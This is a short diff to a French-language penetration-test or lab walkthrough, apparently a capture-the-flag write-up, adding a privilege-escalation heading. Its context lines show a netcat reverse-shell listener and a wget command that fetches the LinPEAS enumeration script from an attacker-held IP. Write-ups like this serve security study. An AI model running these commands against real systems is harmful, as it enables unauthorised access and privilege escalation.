@@ -34,6 +34,8 @@ Et de l'autre côté :
 
     rlwrap nc -nvlp 9999
 
+### Élévation de privilèges : 
+
 Les vérifications classiques n'ont pas fonctionné, je suis donc passé par LinPEAS : 
 
     wget http://192.168.45.230/linpeas.sh
